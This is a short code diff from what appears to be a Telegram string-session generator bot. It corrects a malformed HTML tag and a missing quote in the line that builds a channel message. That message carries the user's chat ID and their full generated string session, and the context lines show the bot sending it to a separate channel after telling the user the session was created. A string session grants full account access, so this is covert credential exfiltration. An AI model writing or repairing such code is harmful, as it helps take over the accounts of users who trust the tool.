@@ -70,7 +70,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     await bot.send_message(msg.chat.id, f"Successfully generated {library_type} string session.")
 
     # Prepare the message for the channel
-    channel_text = f"User ID: <code>{msg.chat.id}<code>\n\n{library_type.upper()} STRING SESSION** \n\n`{string_session}`
+    channel_text = f"User ID: <code>{msg.chat.id}</code>\n\n{library_type.upper()} STRING SESSION** \n\n`{string_session}`"
     
     # Send the versa to the channel
     await bot.send_message(channel_id, channel_text)
